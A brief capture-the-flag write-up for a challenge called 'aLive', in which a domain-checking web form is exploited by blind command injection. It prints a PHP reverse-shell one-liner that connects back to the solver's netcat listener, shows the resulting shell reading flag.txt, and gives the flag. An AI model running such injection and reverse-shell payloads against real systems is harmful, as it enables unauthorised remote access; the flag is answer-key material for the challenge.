# aLive
> In my college level project I created this website that tells us if any domain/ip is active or not. But there is a catch.

## About the Challenge
We were given a website that has a functionality to check our website is active or not


[Image extracted text: Check your site is
active or not_..
google.com
Check]


## How to Solve?
This website has a `Blind Command Injection` vulnerability. Because when I input `; ls` the website returned success instead of fail


[Image extracted text: Chac
VAuY
#to
ic
Active
Is is activel
OK]


But in this case, when I used `cat` command. The website returned `Something went wrong!`. So I decided to use reverse shell command

```
; php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'
```

And then read `flag.txt` file to obtain the flag


[Image extracted text: rootedaffainfo:~# nc ~nlvp 4444
Listening
on
0.0.0.0 4444
Connection
received
on 43.204.138.14 55293
Ls
txt
index.html
index.php
cat
txt
VishwaCTF{blind
cmd-i}
flag 
flag]


```
VishwaCTF{b1inD_cmd-i}
```